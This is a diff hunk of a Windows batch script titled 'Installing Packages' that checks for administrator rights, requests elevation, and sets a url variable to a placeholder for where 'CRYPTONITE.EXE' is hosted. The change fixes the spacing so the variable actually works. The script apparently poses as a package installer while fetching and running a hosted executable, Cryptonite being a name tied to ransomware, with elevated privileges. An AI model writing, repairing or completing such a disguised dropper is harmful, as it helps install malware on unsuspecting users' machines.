@@ -4,7 +4,7 @@ title Installing Packages
 
 net session >nul 2>&1
 
-set url = FULL_URL_WHERE_CRYPTONITE.EXE_IS_HOSTED
+set url=FULL_URL_WHERE_CRYPTONITE.EXE_IS_HOSTED
 
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
